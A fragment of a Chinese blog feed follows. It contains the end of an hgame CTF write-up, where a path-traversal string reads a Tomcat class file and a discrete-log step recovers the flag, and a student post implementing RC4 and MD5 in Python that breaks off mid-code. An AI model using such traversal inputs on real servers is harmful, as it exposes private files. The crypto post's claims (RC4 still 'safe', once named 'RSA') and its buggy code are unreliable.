alt></p><p>最终定位到类目录，读取代码<code>../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/hgame/controller/MathController.class</code></p><p>然后反编译，定位到flag的位置</p><figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(value=&#123;<span class="string">"/flag"</span>&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.GET&#125;)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">Flag</span><span class="params">(ModelMap model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"This is the last question."</span>);</span><br><span class="line">    System.out.println(<span class="string">"123852^x % 612799081 = 6181254136845 % 612799081"</span>);</span><br><span class="line">    System.out.println(<span class="string">"The flag is hgame&#123;x&#125;.x is a decimal number."</span>);</span><br><span class="line">    model.addAttribute(<span class="string">"flag"</span>, <span class="string">"Flag is not here."</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>这个数学问题可以用<strong>Baby Step Giant Step</strong>算法解决，github上有相关的代码</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py bsgs.py 123852 6181254136845 612799081</span><br></pre></td></tr></table></div></figure><p>可以得到最小的答案是<code>15387368</code></p><p>flag如下：<code>hgame{15387368}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;
          &lt;a href=&quot;#前言&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;前言&lt;/h1&gt;
      &lt;p&gt;寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>密码学作业记录（二）</title>
    <link href="http://chaosec.top/2019/01/15/crypto2/"/>
    <id>http://chaosec.top/2019/01/15/crypto2/</id>
    <published>2019-01-15T15:26:17.000Z</published>
    <updated>2019-01-30T11:44:37.833Z</updated>
    
    <content type="html"><![CDATA[<p>接上篇</p><a id="more"></a>        <h1 id="序列密码">          <a href="#序列密码" class="heading-link"><i class="fas fa-link"></i></a>序列密码</h1>              <h2 id="RC4算法">          <a href="#RC4算法" class="heading-link"><i class="fas fa-link"></i></a>RC4算法</h2>      <p>​RC4算法是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 </p><p><strong>算法原理：</strong></p><p>​RSA算法原理非常简单，256字节的状态向量S= {0，1，…，255}，用比特字节表示为S= {00000000, 00000001, ….，11111111}。用一个可变长度为1~256字节（8~8048位）的密钥来初始化256字节的状态向量S={S[0], S[1], …, S[255]}，任何时候，S都包含0~255的8位无符号数的排列组合。加密和解密时，密码流中的每一个字节k由S产生，通过系统的方式随机从S的256个元素中选取一个。每产生一个字节k，S的元素都要被再次排列。具体步骤如下:<br>​    </p><ul><li>步骤一：S向量原状态：  <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​S&#x3D;[0,1,2,...,255]</span><br></pre></td></tr></table></div></figure></li><li>步骤二：创建临时向量T（256位），如果密钥K的长度为256位，则直接将K赋给T，否则一直重复复制K，直到填满256位的向量T </li><li>步骤三：接下来我们使用T向量来产生S的初始排列。这个过程从S[0]开始一直处理到S[255]，同时对每个S[i]，根据T[i指定的方案将S[i]与S的另一个元素进行交换： </li><li>步骤四：密码流产生。一旦S向量的初始排列完成后，密钥就不再被使用。接下来就是使用S自身来不断输出伪随机密码流的过程了。 </li><li>步骤五：加密。将步骤四中获得的随机字节k与明文的下一字节做异或运算，产生的字节即为对应的密文字节。 </li></ul><p>​解密时，由于加密只是使用密码流对明文做了异或运算，因此解密过程只需要使用相同步骤产生密码流并对密文进行同样的异或运算即可得到加密前的明文。 </p><p><strong>代码如下：</strong></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化s</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">s.append(i);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥</span></span><br><span class="line"><span class="comment"># 通常取16字节</span></span><br><span class="line">k = [<span class="number">1</span>,<span class="number">45</span>,<span class="number">12</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">123</span>,<span class="number">45</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">65</span>,<span class="number">23</span>,<span class="number">44</span>,<span class="number">55</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为暂时向量t赋值</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">t.append(k[i % len(k)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j = (j+s[i]+t[i]) % <span class="number">256</span></span><br><span class="line">s[i],s[j] = s[j],s[i]</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'a.txt'</span>,<span class="string">'rb'</span>)</span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 产生密钥流</span></span><br><span class="line">q = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> range(len(text)):</span><br><span class="line">i = (i+<span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">j = (j+s[i]) % <span class="number">256</span></span><br><span class="line">s[i],s[j] = s[j],s[i]</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">q.append(s[t])</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">t = (q[i] ^ text[i]) % <span class="number">128</span></span><br><span class="line">cipher += chr(t)</span><br><span class="line"></span><br><span class="line">plain = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">t = (q[i] ^ ord(cipher[i])) % <span class="number">128</span></span><br><span class="line">plain += chr(t)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"d"</span>:</span><br><span class="line">print(<span class="string">"plain: "</span>)</span><br><span class="line">print(plain)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"cipher: "</span>)</span><br><span class="line">print(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></div></figure><p><strong>实例演示：</strong></p><p>​    代码中加密的是一段英文文本，密文转为base64编码存储</p><p><img src="/2019/01/15/crypto2/1.png" alt="demo"></p><p><strong>安全性分析</strong></p><p>​    由于RC4算法加密采用的是xor异或运算，所以一旦子密钥序列出现了重复，密文就有可能被破解。 那么，RC4算法生成的子密钥序列是否会出现重复呢？由于存在部分弱密钥，使得子密钥序列在不到100万字节内就发生了完全的重复，如果是部分重复，则可能在不到10万字节内就能发生重复。所以在使用中应该对密钥进行检查。</p><p>​    根据目前的分析结果，没有任何的分析对于密钥长度达到128位的RC4有效，目前主要的攻击方法还是穷举攻击，所以到目前为止，RC4还算一个安全的加密算法。</p><p>​    2015年，比利时研究人员Mathy Vanhoef及Frank Piessens，公布了针对RC4加密算法的新型攻击程式，可在75小时内取得cookie的内容。  </p><p><strong>实用性分析</strong></p><p>​    RC4算法等序列密码加密过程较之分组密码而言相对简单，实现起来相对容易，在加密效率上对分组密码的优势是不言而喻的。此外，对于需要加密/解密数据流的应用，比如在数据通信信道或浏览器/网络链路上，流密码可能是更好的选择 。</p><hr><p>​    流密码在安全性强度上不逊分组密码，而加密速率又远优于后者，那是不是说明流密码可以完全取代分组密码呢？很可惜，答案是否定的。 </p><p>​    众所周知，分组密码的设计关键在于加解密算法，是明文和密文在密钥的控制下尽可能复杂，而序列密码的设计关键在于密钥序列产生器，使生成的密钥序列具有不可预测性。而密码序列产生器，也就是伪随机数字节流的产生，依赖种子（密钥）和伪随机函数，而如果种子和伪随机函数不变的情况下，每次产生的伪随机数字节流都是一样的。如果每次都用同样的密钥作为PRF的输入，产生同样的密码流来与两个不同的明文流分别进行异或运算得到两个密文流，那么将这两个密文流进行异或，结果就是两个原始明文的异或值。如果明文是文本字符串或其他已知其性质的字节流，那么密码破解很可能会成功。因此，对于这些已知性质的字节流进行流密码加密，密钥就不能被重复使用了。在这一点上，分组密码的优点就体现出来了。 </p>        <h1 id="哈希函数">          <a href="#哈希函数" class="heading-link"><i class="fas fa-link"></i></a>哈希函数</h1>      <p>​    哈希函数的单向性，压缩性，抗碰撞性等特点使得它能够解决实际应用中很多棘手的安全问题，诸如数字签名，文件指纹等。</p>        <h2 id="MD5算法">          <a href="#MD5算法" class="heading-link"><i class="fas fa-link"></i></a>MD5算法</h2>      <p>​    MD5(Message Digest Algorithm 5)，为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。 </p><p>​    MD5是一种信息摘要算法，MD5算法对输入任意长度的消息进行运行，通过特定的hash散列方法将文本信息转换成产生一个128位的消息摘要，压缩+加密+hash算法的结合体，是绝对不可逆的。</p><p><strong>算法原理：</strong><br>​</p><ul><li>步骤一：数据填充。对消息进行数据填充，使消息的长度对512取模得448，设消息长度为X，即满    足X mod 512=448。根据此公式得出需要填充的数据长度。填充方法：在消息后面进行填充，填充第一位为1，其余为0。</li><li>步骤二：添加消息长度。在第一步结果之后再填充上原消息的长度，可用来进行的存储长度为64位。如果消息长度大于264，则只使用其低64位的值，即（消息长度 对 264取模）。在此步骤进行完毕后，最终消息长度就是512的整数倍。</li><li>步骤三：初始化链接变量。MD5使用4个32位的寄存器A、B、C、D，最开始存放4个固定的32位初始链接变量，这些参数用于第一轮迭代。</li><li>步骤四：分组处理。将每个分组（512比特）分成16个小组，每个小组32位，这些分组参与每轮16步的函数运算，输出为32位值，经过4轮（共有四个轮函数）共64步之后，得到的4个寄存器的值分别于输入链接变量进行模加，即得到此次分组处理的输入链接变量。第四轮最后一步完成后，再与该分组最初的寄存器的初值相加，然后把A、B、C、D的值作为下一个迭代压缩的链接变量输入，直到最后一个消息分组得到的A、B、C、D寄存器值级联输出作为128比特的消息散列值。</li></ul><p>​    此处需要特别指出的是，在MD5的代码实现中，要特别注意<strong>小端序</strong>和<strong>大端序</strong>的问题，这个问题如果不注意的话会导致MD5计算出错。而MD5的所有数据计算都是基于<strong>小端序</strong>的。</p><blockquote><p>小端字节序（Little Endian）：低位字节存放在低内存地址，高位字节存放在高内存地址端。  大端字节序（Big Endian）：高位字节存放在低内存地址，低位字节存放在高内存地址端。</p></blockquote><p>​    在步骤二中添加消息长度就要按照小端序的方法填充长度，同时轮函数中各个参数也要按照小端序来计算，这点一定要特别注意。</p><p>​    还有对于需要处理多个分组的情况，要做好A、B、C、D寄存器的及时更新，否则无法得到正确的MD5值。</p><p><em>代码如下：</em></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串转为2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(s)</span>:</span></span><br><span class="line">text = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">text += <span class="string">'&#123;:0&gt;8&#125;'</span>.format(bin(ord(i))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 附加填充，输入为字母明文，输出为二进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additonal_filling</span><span class="params">(data)</span>:</span></span><br><span class="line">bin_data = str2bin(data)</span><br><span class="line">origi_mess_len = len(bin_data)</span><br><span class="line"><span class="keyword">if</span> origi_mess_len &gt; math.pow(<span class="number">2</span>,<span class="number">64</span>):</span><br><span class="line">print(<span class="string">'Message too long!'</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">bit_origi_mess_len = <span class="string">f'<span class="subst">&#123;bin(origi_mess_len)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">64</span>&#125;</span>'</span></span><br><span class="line">mod_remain = origi_mess_len % <span class="number">512</span>  <span class="comment"># 余数</span></span><br><span class="line"><span class="keyword">if</span> mod_remain &lt; <span class="number">449</span>:</span><br><span class="line">padding_len = <span class="number">448</span> - mod_remain</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">padding_len = <span class="number">448</span> - mod_remain + <span class="number">512</span></span><br><span class="line"><span class="keyword">if</span> padding_len == <span class="number">1</span>:</span><br><span class="line">bin_data += <span class="string">'1'</span></span><br><span class="line"><span class="keyword">elif</span> padding_len &gt; <span class="number">1</span>:</span><br><span class="line">bin_data = bin_data + <span class="string">'1'</span> + <span class="string">'0'</span> * (padding_len<span class="number">-1</span>)</span><br><span class="line">left = bit_origi_mess_len[:<span class="number">32</span>]</span><br><span class="line">right = bit_origi_mess_len[<span class="number">32</span>:]</span><br><span class="line">left = left[<span class="number">24</span>:<span class="number">32</span>] + left[<span class="number">16</span>:<span class="number">24</span>] + left[<span class="number">8</span>:<span class="number">16</span>] + left[:<span class="number">8</span>]</span><br><span class="line">right = right[<span class="number">24</span>:<span class="number">32</span>] + right[<span class="number">16</span>:<span class="number">24</span>] + right[<span class="number">8</span>:<span class="number">16</span>] + right[:<span class="number">8</span>]</span><br><span class="line"><span class="comment"># 32为为一组</span></span><br><span class="line">bin_data += (right + left)</span><br><span class="line"><span class="keyword">return</span> bin_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 迭代压缩，输出为分组比特消息数组，每组的长度为512bit</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iter_compress</span><span class="params">(bdata)</span>:</span></span><br><span class="line">group_mess = [[]*<span class="number">16</span>] <span class="comment"># 分组消息数组</span></span><br><span class="line">print(len(bdata))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bdata)//<span class="number">512</span>):</span><br><span class="line">temp = bdata[i*<span class="number">512</span>:i*<span class="number">512</span>+<span class="number">512</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">print(temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line">group_mess[i].append(temp[j*<span class="number">32</span>:j*<span class="number">32</span>+<span class="number">32</span>])</span><br><span class="line"><span class="keyword">return</span> group_mess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 小端序处理 @input hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">little_endian</span><span class="params">(x,n)</span>:</span></span><br><span class="line">x = <span class="string">f'<span class="subst">&#123;bin(x)[<span class="number">2</span>:]:<span class="number">0</span>&gt;&#123;n&#125;</span>&#125;'</span></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n//<span class="number">8</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">ans += x[(i<span class="number">-1</span>)*<span class="number">8</span>:i*<span class="number">8</span>]</span><br><span class="line"><span class="keyword">return</span> int(ans,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于逻辑非比较特殊，所以另外实现一下,输入为16进制数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_operate</span><span class="params">(data)</span>:</span></span><br><span class="line">data = <span class="string">f'<span class="subst">&#123;bin(data)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">32</span>&#125;</span>'</span></span><br><span class="line">out = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">"0"</span>:</span><br><span class="line">out += <span class="string">"1"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">out += <span class="string">"0"</span></span><br><span class="line"><span class="keyword">return</span> int(out,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 四个非线性函数,输入均为32bit的三个数据</span></span><br><span class="line"><span class="comment"># @input hex</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span><span class="params">(x, y, z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (x&amp;y) | (not_operate(x) &amp; z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">G</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (x &amp; z) | (y &amp; not_operate(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">H</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> (x ^ y ^ z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">I</span><span class="params">(x,y,z)</span>:</span></span><br><span class="line"><span class="keyword">return</span> y ^ (x | not_operate(z))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotate_move</span><span class="params">(x,n)</span>:</span></span><br><span class="line">x = <span class="string">f'<span class="subst">&#123;bin(x)[<span class="number">2</span>:]:<span class="number">0</span>&gt;<span class="number">32</span>&#125;</span>'</span></span><br><span class="line"><span class="keyword">return</span> int(x[n:] + x[:n],<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># t[i]，返回10进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_t</span><span class="params">(i)</span>:</span></span><br><span class="line"><span class="keyword">return</span> int(math.pow(<span class="number">2</span>,<span class="number">32</span>) * abs(math.sin(i)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># @input digital</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FF</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line"><span class="comment"># m = int(m,2)</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + F(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GG</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + G(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HH</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + H(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">II</span><span class="params">(a,b,c,d,m,s,Ti)</span>:</span></span><br><span class="line">m = little_endian(int(m,<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line">t = a + I(b,c,d) + m + Ti </span><br><span class="line">t = t % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line">a = (rotate_move(t,s) + b) % (<span class="number">2</span>**<span class="number">32</span>)</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span><span class="params">(M)</span>:</span></span><br><span class="line"><span class="keyword">global</span> A</span><br><span class="line"><span class="keyword">global</span> B</span><br><span class="line"><span class="keyword">global</span> C</span><br><span class="line"><span class="keyword">global</span> D</span><br><span class="line"><span class="comment"># 复制前一分组的链接变量</span></span><br><span class="line">AA = A</span><br><span class="line">BB = B</span><br><span class="line">CC = C</span><br><span class="line">DD = D</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(M)):</span><br><span class="line"><span class="comment"># 第一轮循环</span></span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">0</span>],<span class="number">7</span>,get_t(<span class="number">1</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">1</span>],<span class="number">12</span>,get_t(<span class="number">2</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span class="number">2</span>],<span class="number">17</span>,get_t(<span class="number">3</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">3</span>],<span class="number">22</span>,get_t(<span class="number">4</span>))</span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">4</span>],<span class="number">7</span>,get_t(<span class="number">5</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">5</span>],<span class="number">12</span>,get_t(<span class="number">6</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span class="number">6</span>],<span class="number">17</span>,get_t(<span class="number">7</span>))</span><br><span class="line">B = FF(B,C,D,A,M[i][<span class="number">7</span>],<span class="number">22</span>,get_t(<span class="number">8</span>))</span><br><span class="line">A = FF(A,B,C,D,M[i][<span class="number">8</span>],<span class="number">7</span>,get_t(<span class="number">9</span>))</span><br><span class="line">D = FF(D,A,B,C,M[i][<span class="number">9</span>],<span class="number">12</span>,get_t(<span class="number">10</span>))</span><br><span class="line">C = FF(C,D,A,B,M[i][<span 